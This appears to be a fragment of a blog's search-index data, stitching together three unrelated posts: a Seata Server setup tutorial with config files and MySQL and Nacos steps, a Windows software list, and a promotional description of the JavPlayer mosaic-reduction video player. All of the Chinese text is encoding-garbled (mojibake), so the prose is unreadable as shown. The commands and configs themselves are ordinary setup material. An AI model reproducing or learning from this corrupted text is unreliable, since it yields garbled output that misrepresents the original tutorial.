ç«¯ï¼‰éœ€è¦å•ç‹¬ä½œä¸ºæœåŠ¡ç«¯éƒ¨ç½²ï¼ŒTM å’Œ RMï¼ˆClient ç«¯ï¼‰ç”±ä¸šåŠ¡ç³»ç»Ÿé›†æˆï¼ˆå¦‚ Mavenã€Gradleï¼‰ã€‚ Seata Server ä¸‹è½½1ï¼‰Seata Server çš„å®˜æ–¹ä¸‹è½½åœ°å€åœ¨è¿™é‡Œï¼Œç›´æ¥ä¸‹è½½å·²ç¼–è¯‘å¥½çš„äºŒè¿›åˆ¶åŒ…ï¼ˆseata-server-1.4.0.tar.gz ï¼‰ï¼Œç„¶åè§£å‹å³å¯ä½¿ç”¨ 12345# ä¸‹è½½$ wget https://github.com/seata/seata/releases/download/v1.4.0/seata-server-1.4.0.tar.gz# è§£å‹$ tar -xvf seata-server-1.4.0.tar.gz 2ï¼‰Seata çš„åˆå§‹åŒ–èµ„æºçš„å®˜æ–¹ä¸‹è½½åœ°å€åœ¨è¿™é‡Œï¼Œéœ€è¦ä¸‹è½½ Seata çš„æºä»£ç åŒ…ï¼ˆSource codeï¼‰ï¼Œåé¢åˆå§‹åŒ–æ•°æ®åº“æˆ–è€…é…ç½®ä¸­å¿ƒæ—¶ä¼šç”¨åˆ°èµ„æºç›®å½•é‡Œçš„æ–‡ä»¶ 1234567891011# ä¸‹è½½$ wget https://github.com/seata/seata/archive/v1.4.0.tar.gz# è§£å‹# tar -xvf v1.4.0.tar.gz# èµ„æºç›®å½•çš„ç»“æ„seata-1.4.0/scriptâ”œâ”€â”€ clientâ”œâ”€â”€ config-centerâ””â”€â”€ server èµ„æºç›®å½•è¯´æ˜å¦‚ä¸‹ï¼š serverï¼šServer ç«¯æ•°æ®åº“è„šæœ¬åŠå„ä¸ªå®¹å™¨é…ç½® clientï¼šå­˜æ”¾ Client ç«¯çš„ SQL è„šæœ¬ã€å‚æ•°é…ç½® config-centerï¼šå„ä¸ªé…ç½®ä¸­å¿ƒå‚æ•°å¯¼å…¥è„šæœ¬ï¼Œå…¶ä¸­çš„ config.txt(åŒ…å« Server å’Œ Clientï¼ŒåŸåä¸º nacos-config.txt) ä¸ºé€šç”¨å‚æ•°æ–‡ä»¶ Seata Server é…ç½®1ï¼‰å°† Seata Serverï¼ˆTCï¼‰çš„å­˜å‚¨æ¨¡å¼æ›´æ”¹ä¸º DBï¼Œå³ä½¿ç”¨æ•°æ®åº“æ¥å­˜å‚¨å…¨å±€äº‹åŠ¡ä¼šè¯ä¿¡æ¯ï¼ŒåŒæ—¶è‡ªå®šä¹‰äº‹åŠ¡ç»„çš„åç§°ã€‚è¿™é‡Œæ¼”ç¤ºä½¿ç”¨çš„æ•°æ®åº“ä¸º MySQLï¼Œé»˜è®¤æ”¯æŒçš„æ•°æ®åº“ç±»å‹åŒ…æ‹¬ï¼šMySQLã€Oracleã€PostgreSQLã€H2ã€Oceanbaseï¼Œå…¶ä¸­ service.vgroupMapping çš„è¯¦ç»†ä»‹ç»å¯ä»¥çœ‹è‡ªå®šä¹‰äº‹åŠ¡ç»„çš„åç§° 12345678910111213141516171819202122232425262728# å¤‡ä»½é…ç½®æ–‡ä»¶$ cp seata/conf/file.conf seata/conf/file.conf.bak# ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œæ›´æ”¹æˆ–è€…æ–°å¢ä»¥ä¸‹å†…å®¹$ vim seata/conf/file.confservice { vgroupMapping.tx_group_test = "default" #è‡ªå®šä¹‰äº‹åŠ¡ç»„çš„åç§°ï¼Œè‹¥ä¸å­˜åœ¨serviceé…ç½®é¡¹ï¼Œç›´æ¥æ–°å¢å¯¹åº”çš„é…ç½®å†…å®¹å³å¯ default.grouplist = "127.0.0.1:8091" enableDegrade = false disable = false max.commit.retry.timeout = "-1" max.rollback.retry.timeout = "-1" disableGlobalTransaction = false}store { mode = "db" # å­˜å‚¨æ¨¡å¼ db { dbType = "mysql" # æ•°æ®åº“ç±»å‹ datasource = "druid" # æ•°æ®åº“è¿æ¥æ±  driverClassName = "com.mysql.cj.jdbc.Driver" # æ•°æ®åº“é©±åŠ¨ url = "jdbc:mysql://127.0.0.1:3306/seata?useUnicode=true&amp;characterEncoding=utf8&amp;allowMultiQueries=true&amp;useSSL=false" # æ•°æ®åº“è¿æ¥åœ°å€ user = "mysql" # æ•°æ®åº“ç”¨æˆ·å password = "mysql" # æ•°æ®åº“å¯†ç  }} 2ï¼‰åˆå§‹åŒ– Seata Serverï¼ˆTCï¼‰ä¾èµ–çš„ MySQL æ•°æ®åº“ï¼Œç”¨äºå­˜å‚¨å…¨å±€äº‹åŠ¡ä¼šè¯ä¿¡æ¯ï¼ŒSQL åˆå§‹åŒ–è„šæœ¬çš„ä½ç½®æ˜¯ Seata æºç ç›®å½•ä¸‹çš„ script/server/db/mysql.sqlã€‚å…¨å±€äº‹åŠ¡ä¼šè¯ä¿¡æ¯ç”±ä¸‰å—å†…å®¹æ„æˆï¼Œå…¨å±€äº‹åŠ¡ â€“&gt; åˆ†æ”¯äº‹åŠ¡ â€“&gt; å…¨å±€é”ï¼Œå¯¹åº”çš„è¡¨åˆ†åˆ«æ˜¯ global_tableã€branch_tableã€lock_table 12345678910111213141516171819# åˆ›å»ºSeataæ•°æ®åº“mysql&gt; create database seata default character set utf8;# åˆ‡æ¢æ•°æ®åº“mysql&gt; use seata;# æ‰§è¡ŒSQLåˆå§‹åŒ–è„šæœ¬mysql&gt; source seata-1.4.0/script/server/db/mysql.sql# æŸ¥çœ‹æ•°æ®åº“è¡¨mysql&gt; show tables;+-----------------+| Tables_in_seata |+-----------------+| branch_table || global_table || lock_table |+-----------------+3 rows in set (0.00 sec) 3ï¼‰æŒ‡å®š Seata Serverï¼ˆTCï¼‰ä¾èµ–çš„æ³¨å†Œä¸­å¿ƒï¼Œè¿™é‡Œä½¿ç”¨çš„æ³¨å†Œä¸­å¿ƒæ˜¯ Nacosã€‚ä¸ºäº†æ¼”ç¤ºæ–¹ä¾¿ï¼Œè¿™é‡Œä¸å†ä½¿ç”¨é…ç½®ä¸­å¿ƒæ¥å­˜å‚¨ TC çš„ç›¸å…³é…ç½®ï¼Œå³ç›´æ¥ä½¿ç”¨æœ¬åœ°çš„ file.conf é…ç½®æ–‡ä»¶ã€‚é»˜è®¤æ”¯æŒçš„æ³¨å†Œä¸­å¿ƒä¸é…ç½®ä¸­å¿ƒåˆ—è¡¨å¦‚ä¸‹ï¼š é…ç½®ä¸­å¿ƒæ”¯æŒç±»å‹ï¼šFileã€Nacos ã€Apolloã€Zookeeperã€Consulã€Etcd3 æ³¨å†Œä¸­å¿ƒæ”¯æŒç±»å‹ï¼šFile ã€Nacos ã€Eurekaã€Zookeeperã€Consulã€Etcd3ã€Sofaã€Redis 123456789101112131415161718192021222324252627# å¤‡ä»½é…ç½®æ–‡ä»¶$ cp seata/conf/registry.conf seata/conf/registry.conf.bak# ç¼–è¾‘é…ç½®æ–‡ä»¶ï¼Œæ›´æ”¹æˆ–è€…æ–°å¢ä»¥ä¸‹å†…å®¹$ vim seata/conf/registry.confregistry { type = "nacos" nacos { application = "seata-server" serverAddr = "127.0.0.1:8848" group = "SEATA_GROUP" namespace = "" cluster = "default" username = "" password = "" }}config { type = "file" file { name = "file.conf" }} Seata Server å¯åŠ¨å…ˆå°† Seata Server ä¾èµ–çš„æ•°æ®åº“ã€æ³¨å†Œä¸­å¿ƒæœåŠ¡å¯åŠ¨äº†ï¼Œæœ€åæ‰å¯åŠ¨ Seata Serverã€‚ 1234567891011121314# åˆ›å»ºGCçš„æ—¥å¿—ç›®å½•$ mkdir seata/logs# è¿›å…¥binç›®å½•$ cd seata/bin# æ‰§è¡Œå¯åŠ¨è„šæœ¬$ sh seata-server.sh# æˆ–è€…åå°å¯åŠ¨$ nohup sh seata-server.sh &amp;# æˆ–è€…æŒ‡å®šå¯åŠ¨å‚æ•°$ sh seata-server.sh -h 127.0.0.1 -p 8091 -n 1 å¯åŠ¨å‚æ•°è¯´æ˜å¦‚ä¸‹ï¼š -h: æ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒçš„ IP -p: Seata Server çš„æœ¬åœ°ç›‘å¬ç«¯å£ï¼Œé»˜è®¤ç«¯å£æ˜¯ 8091 -m: å…¨å±€äº‹åŠ¡ä¼šè¯ä¿¡æ¯å­˜å‚¨æ¨¡å¼ï¼Œfileã€dbã€redisï¼Œä¼˜å…ˆè¯»å–å¯åŠ¨å‚æ•° (Seata-Server 1.3 åŠä»¥ä¸Šç‰ˆæœ¬æ”¯æŒ Redis) -n: Server Nodeï¼Œå¤šä¸ª Server æ—¶ï¼Œéœ€åŒºåˆ†å„è‡ªèŠ‚ç‚¹ï¼Œç”¨äºç”Ÿæˆä¸åŒåŒºé—´çš„ transactionIdï¼Œä»¥å…å†²çª -e: å¤šç¯å¢ƒé…ç½®å¯ä»¥å‚è€ƒè¿™é‡Œ ç‰¹åˆ«æ³¨æ„ï¼šå †å†…å­˜å»ºè®®åˆ†é… 2Gï¼Œå †å¤–å†…å­˜ 1Gï¼ŒJVM çš„å†…å­˜å‚æ•°å¯ä»¥ç›´æ¥åœ¨ seata/bin/-server.sh è„šæœ¬é‡Œè°ƒæ•´ Seata Server æˆåŠŸå¯åŠ¨åï¼Œåœ¨æ³¨å†Œä¸­å¿ƒçš„æœåŠ¡åˆ—è¡¨é‡Œï¼Œå¯ä»¥çœ‹åˆ° Seata Server çš„æœåŠ¡å·²ç»æˆåŠŸæ³¨å†Œï¼š Seata Server é…ç½®ä»‹ç»é…ç½®æ–‡ä»¶è¯´æ˜ conf/file.confï¼š TC çš„é…ç½®æ–‡ä»¶ï¼Œç”¨äºæŒ‡å®š TC çš„ç›¸å…³é…ç½®ã€‚å¦‚æœä½¿ç”¨äº†é…ç½®ä¸­å¿ƒï¼Œä¹Ÿå¯ä»¥å°† file.conf é‡Œçš„é…ç½®ä¿¡æ¯å†™å…¥åˆ°é…ç½®ä¸­å¿ƒã€‚ conf/registry.confï¼šç”¨äºæŒ‡å®š TC çš„æ³¨å†Œä¸­å¿ƒå’Œ TC çš„é…ç½®æ–‡ä»¶ï¼Œé»˜è®¤ç±»å‹éƒ½æ˜¯ fileã€‚å¦‚æœä½¿ç”¨å…¶ä»–æ³¨å†Œä¸­å¿ƒï¼Œè¦æ±‚ Seata Server è‡ªèº«ä¹Ÿæ³¨å†Œåˆ°æ³¨å†Œä¸­å¿ƒã€‚ é…ç½®ä¸­å¿ƒä½¿ç”¨è‹¥åœ¨ registry.conf ä¸­æŒ‡å®šä½¿ç”¨é…ç½®ä¸­å¿ƒæ¥å­˜å‚¨ TC çš„ç›¸å…³é…ç½®ï¼ˆå¦‚ä¸‹ï¼‰ï¼Œå³åˆ©ç”¨é…ç½®ä¸­å¿ƒæ¥æ›¿ä»£ file.conf é…ç½®æ–‡ä»¶ï¼Œé‚£ä¹ˆæ­¤æ—¶éœ€è¦æ‰‹åŠ¨å°† file.conf é‡Œçš„é…ç½®ä¿¡æ¯æ·»åŠ åˆ°é…ç½®ä¸­å¿ƒ 12345678910111213config { type = "nacos" nacos { serverAddr = "127.0.0.1:8848" namespace = "" group = "SEATA_GROUP" username = "" password = "" } ...} Seata å®˜æ–¹æä¾›äº†å°†é…ç½®ä¿¡æ¯æ‰¹é‡å†™å…¥åˆ°å„ç§ä¸»æµé…ç½®ä¸­å¿ƒçš„ Shell è„šæœ¬ï¼Œå­˜æ”¾è·¯å¾„æ˜¯åœ¨ Seata æºç ç›®å½•ä¸‹çš„ script/config-center ç›®å½•ï¼ˆå¦‚ä¸‹ï¼‰ 1234567891011121314script/config-centerâ”œâ”€â”€ apolloâ”‚&nbsp;&nbsp; â””â”€â”€ apollo-config.shâ”œâ”€â”€ config.txtâ”œâ”€â”€ consulâ”‚&nbsp;&nbsp; â””â”€â”€ consul-config.shâ”œâ”€â”€ etcd3â”‚&nbsp;&nbsp; â””â”€â”€ etcd3-config.shâ”œâ”€â”€ nacosâ”‚&nbsp;&nbsp; â”œâ”€â”€ nacos-config.pyâ”‚&nbsp;&nbsp; â””â”€â”€ nacos-config.shâ”œâ”€â”€ README.mdâ””â”€â”€ zk â””â”€â”€ zk-config.sh å…¶ä¸­ config.txt ä¸ºé€šç”¨å‚æ•°æ–‡ä»¶ï¼ŒåŒ…å«äº† Seata Server éœ€è¦çš„æ‰€æœ‰é…ç½®ä¿¡æ¯ï¼Œåªéœ€æ‰§è¡Œå¯¹åº”çš„ Shell è„šæœ¬å°†é…ç½®ä¿¡æ¯å†™å…¥åˆ°é…ç½®ä¸­å¿ƒå³å¯ã€‚å€¼å¾—ä¸€æçš„æ˜¯ï¼Œconfig.txt æ–‡ä»¶å¿…é¡»åœ¨ xxxx.sh çš„ä¸Šçº§ç›®å½•é‡Œï¼›è‹¥ä½¿ç”¨ Nacos ä½œä¸ºé…ç½®ä¸­å¿ƒï¼Œæ‰§è¡Œè„šæœ¬æ—¶å¯ä»¥æŒ‡å®šä¸€äº›å¯åŠ¨å‚æ•°ï¼Œå¦‚ Nacos çš„ IPã€ç«¯å£å·ã€å‘½åç©ºé—´ã€é…ç½®ç»„ç­‰ï¼ŒShell è„šæœ¬çš„å…·ä½“ä½¿ç”¨æ–¹æ³•å¯ä»¥æŸ¥çœ‹ script/config-center/README.md è¯´æ˜æ–‡æ¡£ã€‚ 1$ nacos-config.sh -h 127.0.0.1 -p 8848 -t namespace -g group -u username -w password æˆåŠŸæ‰¹é‡å¯¼å…¥é…ç½®ä¿¡æ¯åˆ°é…ç½®ä¸­å¿ƒåï¼Œæ§åˆ¶å°ä¼šè¾“å‡ºå¦‚ä¸‹æç¤ºï¼š 1234========================================================================= Complete initialization parameters, total-count:79 , failure-count:0========================================================================= Init nacos config finished, please start seata-server. è®¿é—® Nacos çš„æ§åˆ¶å°ï¼Œå¯ä»¥çœ‹åˆ°å·²ç»æœ‰å¯¹åº”çš„é…ç½®ä¿¡æ¯ é…ç½® TC çš„å­˜å‚¨æ¨¡å¼Seata Serverï¼ˆTCï¼‰çš„å­˜å‚¨æ¨¡å¼ç°æœ‰ Fileã€DBã€Redis ä¸‰ç§ï¼ˆåç»­å°†å¼•å…¥ Raftã€Mongodbï¼‰ï¼Œéœ€è¦åœ¨ file.conf é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šï¼ˆå¦‚ä¸‹ï¼‰ 123456789101112131415161718192021store { mode = "file" ## file store property file { ## store location dir dir = "sessionStore" # branch session size , if exceeded first try compress lockkey, still exceeded throws exceptions maxBranchSessionSize = 16384 # globe session size , if exceeded throws exceptions maxGlobalSessionSize = 512 # file buffer size , if exceeded allocate new buffer fileWriteBufferCacheSize = 16384 # when recover batch read size sessionReloadReadSize = 100 # async, sync flushDiskMode = async } ...} é»˜è®¤å­˜å‚¨æ¨¡å¼ä¸º Fileï¼Œè‹¥ä½¿ç”¨ File æ¨¡å¼åˆ™æ— éœ€æ”¹åŠ¨ä»»ä½•é…ç½®ï¼Œç›´æ¥å¯åŠ¨å³å¯ï¼Œæ¯ç§æ¨¡å¼çš„è¯´æ˜å¦‚ä¸‹ï¼š File æ¨¡å¼ä¸ºå•æœºæ¨¡å¼ï¼Œå…¨å±€äº‹åŠ¡ä¼šè¯ä¿¡æ¯åœ¨å†…å­˜ä¸­è¯»å†™ï¼Œå¹¶æŒä¹…åŒ–ä¸ºæœ¬åœ°æ–‡ä»¶ root.dataï¼Œæ€§èƒ½è¾ƒé«˜ DB æ¨¡å¼ä¸ºé«˜å¯ç”¨æ¨¡å¼ï¼Œå…¨å±€äº‹åŠ¡ä¼šè¯ä¿¡æ¯é€šè¿‡ DB å…±äº«ï¼Œæ€§èƒ½ä¼šå·®ä¸€ç‚¹ Redis æ¨¡å¼åœ¨ Seata-Server 1.3 åŠä»¥ä¸Šç‰ˆæœ¬å¼€å§‹æ”¯æŒï¼Œæ€§èƒ½è¾ƒé«˜ï¼Œå­˜åœ¨äº‹åŠ¡ä¿¡æ¯ä¸¢å¤±é£é™©ï¼Œéœ€è¦é…ç½®åˆé€‚å½“å‰åœºæ™¯çš„ Redis æŒä¹…åŒ–é…ç½® è‡ªå®šä¹‰äº‹åŠ¡ç»„çš„åç§°ç‰¹åˆ«æ³¨æ„ï¼Œfile.conf ä¸­çš„ service.vgroupMapping è¿™ä¸ªé…ç½®ï¼Œåœ¨ Spring Cloud ä¸­çš„å€¼é»˜è®¤æ˜¯ ${spring.application.name}-fescar-service-groupï¼Œå¯ä»¥é€šè¿‡æŒ‡å®š application.yml ä¸­çš„ spring.cloud.alibaba.seata.tx-service-group è¿™ä¸ªå±æ€§æ¥è¦†ç›–ï¼›ä½†æ˜¯å¿…é¡»è¦å’Œ file.conf ä¸­çš„ service.vgroupMapping ä¸€è‡´ï¼Œå¦åˆ™ä¼šå‡ºç° no available service \'null\' found, please make sure registry config correct çš„é”™è¯¯ï¼Œä¸¾ä¾‹è¯´æ˜å¦‚ä¸‹ï¼š 123service { vgroupMapping.tx_group_test = "default"} 12345spring: cloud: alibaba: seata: tx-service-group: tx_group_test åœ¨ä¸Šè¿°çš„é…ç½®ä¸­ï¼ŒSpring Cloud ä¸­ tx-service-group çš„å€¼ä¹Ÿå¿…é¡»ä¸º tx_group_testï¼›å¦‚æœå°† vgroupMapping.xxxx ä¸­çš„ xxxxï¼ˆKey å€¼ï¼‰æ”¹ä¸º abcdefgï¼Œåˆ™ Spring Cloud ä¸­ tx-service-group çš„å€¼ä¹Ÿå¿…é¡»ä¸º abcdefgï¼Œå³è¿™ä¸¤ä¸ªå€¼å¿…é¡»ä¿æŒä¸€è‡´ Seata Server çš„å‘default.grouplist å±æ€§åœ¨ Seata Server çš„ file.conf é…ç½®æ–‡ä»¶ä¸­ï¼Œæœ‰ä¸ª default.grouplist é…ç½®ï¼Œè¯¥é…ç½®çš„ä½¿ç”¨è¯´æ˜å¦‚ä¸‹ï¼š 1ï¼‰åªæœ‰åœ¨ registry.conf ä¸­é…ç½®äº† registry.type=fileï¼Œå³æ³¨å†Œä¸­å¿ƒæ˜¯ File æ¨¡å¼æ—¶ï¼Œè¯¥é…ç½®æ‰ä¼šèµ·ä½œç”¨ 2ï¼‰å¯¹åº”çš„å€¼å¯ä»¥é…ç½®å¤šä¸ªï¼Œé…ç½®å¤šä¸ªå°±éœ€è¦æ­å»º Seata Server é›†ç¾¤ã€‚ç”±äºé»˜è®¤å¹¶æœªæä¾›æœ¬åœ°æ–‡ä»¶çš„åŒæ­¥åŠŸèƒ½ï¼Œæ‰€ä»¥åœ¨ store.mode=file æ¨¡å¼ä¸‹ï¼Œè¿™ç§é›†ç¾¤æ–¹å¼çš„é…ç½®ä¼šæŠ¥é”™ï¼›å¦‚æœ Seata Server æ­å»ºä¸ºé›†ç¾¤ï¼Œä¸” store.mode=dbï¼Œè¿™æ ·å°±å¯ä»¥é€šè¿‡ DB æ¥å…±äº« TCï¼ˆSeata Serverï¼‰ é›†ç¾¤é—´çš„æ•°æ® 3ï¼‰å½“ registry.type=file æ—¶ï¼Œè¿™ä¸ª default.grouplist æ‰ä¼šèµ·ä½œç”¨ï¼Œä½†æ˜¯ File æ–¹å¼å¹¶ä¸èƒ½æä¾›ä¸€ä¸ªæ³¨å†Œä¸­å¿ƒçš„å®Œæ•´åŠŸèƒ½ï¼Œæ¯”å¦‚å¥åº·æ£€æŸ¥æœºåˆ¶ï¼Œå®ä¾‹åˆ—è¡¨çš„æ›´æ–°å‰”å‡ºç­‰ï¼Œå»ºè®®é€‰æ‹© Nacos ã€Eurekaã€Redisã€Zookeeperã€Consulã€Etcd3ã€Sofa ä½œä¸ºæ³¨å†Œä¸­å¿ƒ 4ï¼‰registry.type=file æˆ– config.type=file çš„è®¾è®¡åˆè¡·ï¼Œæ˜¯è®©å¼€å‘è€…åœ¨ä¸ä¾èµ–ç¬¬ä¸‰æ–¹æ³¨å†Œä¸­å¿ƒæˆ–é…ç½®ä¸­å¿ƒçš„å‰æä¸‹ï¼Œå¯ä»¥é€šè¿‡ File è¿™ç§ç®€å•çš„ç›´è¿å¿«é€ŸéªŒè¯ Seata æœåŠ¡ï¼Œè¾¾åˆ°å¿«é€Ÿä¸Šæ‰‹çš„ç›®çš„ service.vgroup_mapping å±æ€§Seata Server &lt;=1.0 çš„ç‰ˆæœ¬ç”¨çš„æ˜¯ service.vgroup_mappingï¼Œä½†åœ¨æ–°ç‰ˆæœ¬é‡Œæ”¹æˆäº† service.vgroupMappingã€‚è‹¥åº”ç”¨å¯åŠ¨åæ— æ³•è¿æ¥ Seata Serverï¼Œä¸”æŠ›å‡ºäº†ä»¥ä¸‹å¼‚å¸¸ä¿¡æ¯ï¼Œæ­¤æ—¶åº”è¯¥æ³¨æ„ä½¿ç”¨çš„æ˜¯ä¸æ˜¯æ—§çš„ service.vgroup_mapping 1no available service \'null\' found, please make sure registry config correct åœ¨ file.conf é…ç½®æ–‡ä»¶ä¸­ï¼Œservice.vgroupMapping æ”¯æŒé…ç½®å¤šä¸ªï¼š 1234service.vgroupMapping.user-service-group=defaultservice.vgroupMapping.order-service-group=defaultservice.vgroupMapping.account-service-group=defaultservice.vgroupMapping.storage-service-group=default å‚è€ƒæ–‡çŒ® åˆ†å¸ƒå¼äº‹åŠ¡è§£å†³æ–¹æ¡ˆ å¾®æœåŠ¡åˆ†å¸ƒå¼äº‹åŠ¡ 4 ç§è§£å†³æ–¹æ¡ˆå®æˆ˜ å¤§è§„æ¨¡ SOA ç³»ç»Ÿä¸­çš„åˆ†å¸ƒäº‹åŠ¡å¤„äº‹ï¼ˆç¨‹ç«‹ï¼‰ ä¸‹ç¯‡ - Seata å…¥é—¨æ•™ç¨‹ï¼ˆç”µå•†å®æˆ˜ç¯‡ï¼‰ Seata å…¥é—¨æ•™ç¨‹ - å®æˆ˜ç¯‡ï¼ˆç”µå•†ï¼‰ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å¾®æœåŠ¡ åˆ†å¸ƒå¼"},{title:"Windows è£…æœºè½¯ä»¶æ¨è",url:"/posts/697a4777.html",text:'ç£ç›˜ç£ç›˜åˆ†åŒº è¿·ä½ å…”ï¼ˆMiniToolï¼‰åˆ†åŒºå‘å¯¼ ç³»ç»Ÿå¤‡ä»½ è¿·ä½ å…”ï¼ˆMiniToolï¼‰æ•°æ®å¤‡ä»½å¤§å¸ˆ æ•°æ®æ¢å¤ è¿·ä½ å…”ï¼ˆMiniToolï¼‰æ•°æ®æ¢å¤è½¯ä»¶ FTPFTP æœåŠ¡å™¨ FileZilla Server FTP å®¢æˆ·ç«¯ FileZilla Client var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"windowsç³»ç»Ÿ"},{title:"ä¸€æ¬¾å»é©¬èµ›å…‹çš„è§†é¢‘æ’­æ”¾å™¨ JavPlayer",url:"/posts/1f1f7d32.html",text:'ç›¸å…³ç«™ç‚¹ JavPlayer å®˜ç½‘ é™æ—¶å…è´¹è¯•ç”¨å®Œæ•´ç‰ˆä¸‹è½½ äº§å“æ¦‚è¿° JavPlayer æ˜¯ä¸€æ¬¾è§†é¢‘æ’­æ”¾å™¨ï¼ˆæ”¶è´¹ï¼‰ï¼Œå¯ä»¥å‡å°‘é©¬èµ›å…‹è€Œä¸ä¼šä¸¢å¤±ç»†èŠ‚ï¼Œè®©æ²‰ç¡åœ¨ç¡¬ç›˜é‡Œçš„è§†é¢‘å˜æˆå®è—ã€‚JavPlayer ä½¿ç”¨äº† TecoGANï¼ŒTecoGAN æ˜¯ä¸€ç§ä½¿ç”¨æ·±åº¦å­¦ä¹ çš„è§†é¢‘è¶…åˆ†è¾¨ç‡ç®—æ³•ï¼Œæ¥ç®¡éƒ¨åˆ†å¤„ç†çš„è®°å½•æ¨¡å¼æ­£åœ¨æµ‹è¯•ä¸­ã€‚ç‰¹åˆ«è¯´æ˜ï¼Œè¯·å°Šé‡åŸè§†é¢‘åˆ›ä½œè€…çš„ç‰ˆæƒï¼Œè¯·å‹¿æ»¥ç”¨å¹¶éæ³•ä¼ æ’­ç»å¤„ç†åçš„è§†é¢‘ï¼Œç”±æ­¤äº§ç”Ÿçš„åæœåŠä¸€åˆ‡æ³•å¾‹è´£ä»»è‡ªè´Ÿï¼Œç›¸å…³è´£ä»»ä¸€æ¦‚ä¸æœ¬ç«™æ— å…³ã€‚ æ“ä½œç®€ä¾¿ å¯ä»¥é€šè¿‡æ‹–æ”¾è§†é¢‘æ–‡ä»¶æ¥æ’­æ”¾å®ƒ å¦‚æœæ˜¯åœ¨ 2012~2016 å¹´å‘å¸ƒé«˜è´¨é‡è§†é¢‘ï¼Œåˆ™ä¼šæ„Ÿå—åˆ°é»˜è®¤è®¾ç½®çš„é©¬èµ›å…‹ç¼©å°æ•ˆæœ å¦‚æœåœ¨è®¾ç½®é¢æ¿ä¸­è¿›è¡Œäº†è½»å¾®è°ƒæ•´ï¼Œåˆ™ä¼šæ‰©å±•å¯æ”¯æŒçš„è§†é¢‘å®½åº¦ å¯ä»¥é€šè¿‡ä¸€ä¸ªæŒ‰é’®æ•è·éœ€è¦ä¸“ç”¨æ’­æ”¾å™¨çš„è§†é¢‘ å…ˆè¿›çš„æŠ€æœ¯ åˆ†æå›¾åƒå¹¶è‡ªåŠ¨ç¡®å®šé©¬èµ›å…‹çš„é¢ç§¯å’Œç²—ç³™åº¦ æ ¹æ®é©¬èµ›å…‹çš„ç²—ç³™åº¦ï¼ˆå•å…ƒå°ºå¯¸ï¼‰è¿›è¡Œé€‚å½“çš„å¤„â€‹â€‹ç† å³ä½¿ä¸æ˜¯é«˜æ€§èƒ½ PCï¼Œä¹Ÿå¯ä»¥åœ¨æ’­æ”¾å…¨é«˜æ¸…è§†é¢‘æ—¶å®æ—¶å¤„ç† ä¸ä»…ä½¿ç”¨ç®€å•çš„æ¨¡ç³Šï¼Œè€Œä¸”ä½¿ç”¨äº†è¯¸å¦‚è¶…åˆ†è¾¨ç‡æ»¤æ³¢å™¨çš„æ–¹æ³• å„ç§åŠŸèƒ½ æ¯éƒ¨ç”µå½±çš„è®¾ç½®å°†è‡ªåŠ¨ä¿å­˜å¹¶åœ¨ä¸‹æ¬¡æ’­æ”¾æ—¶åŠ è½½ å…·æœ‰ä¸€èˆ¬åŠŸèƒ½ï¼Œä¾‹å¦‚é€å¸§ï¼Œè·³è¿‡ï¼ŒèŒƒå›´é€‰æ‹©å¾ªç¯ï¼Œå›ºå®šå®½é«˜æ¯”å’Œé¢œè‰²æ ¡æ­£ å¦‚æœä¸ºæ¯ä¸ªåœºæ™¯è®¾ç½®é©¬èµ›å…‹ç¼©å°å¤„ç†ï¼Œåˆ™å¯ä»¥åœ¨æ•´ä¸ªé•¿ç‰‡ä¸­è·å¾—è¶³å¤Ÿçš„æ•ˆæœï¼Œä»…é™äº§å“ç‰ˆæœ¬ å¦‚æœå½•åˆ¶å·²å¤„ç†çš„è§†é¢‘ï¼Œåˆ™å¯åœ¨ç§»åŠ¨è®¾å¤‡ä¸Šä½¿ç”¨ æ¨èçš„è¿è¡Œç¯å¢ƒ å®‰è£… DirectX11 CPUï¼ši3 æˆ–æ›´é«˜ GPUï¼šGeForceGT710 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼ˆæˆ–ç­‰æ•ˆçš„å†…ç½® GPUï¼‰ï¼Œæ¨èç”¨äº VR MainXemory çš„ GTX750 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼š4G æˆ–æ›´é«˜ æ“ä½œç³»ç»Ÿï¼šWindows8ã€Windows10ï¼ˆ32 ä½ï¼Œ64 ä½ï¼‰ï¼ŒWindows7 ä¸Šæ— æ³•ä½¿ç”¨æ•è·å’Œå½•åˆ¶ TecoGAN éœ€è¦å…¼å®¹ AVX çš„ CPUï¼ˆSandyBridge æˆ–æ›´é«˜ç‰ˆæœ¬ï¼Œi3 æˆ–æ›´é«˜ç‰ˆæœ¬ï¼‰å’Œ 64 ä½ Windows TrialVersion çš„é™åˆ¶ å½•åˆ¶åˆ›å»ºçš„è§†é¢‘å®½åº¦å›ºå®šä¸º 640 åƒç´ ï¼Œå¯åœ¨äº§å“ç‰ˆæœ¬ä¸­æŒ‡å®š å³ä½¿æŒ‡å®šäº†èŒƒå›´ï¼Œå½•åˆ¶ä¹Ÿå°†åœ¨ 1 åˆ†é’Ÿåç»“æŸï¼Œäº§å“ç‰ˆæœ¬æ— é™åˆ¶ 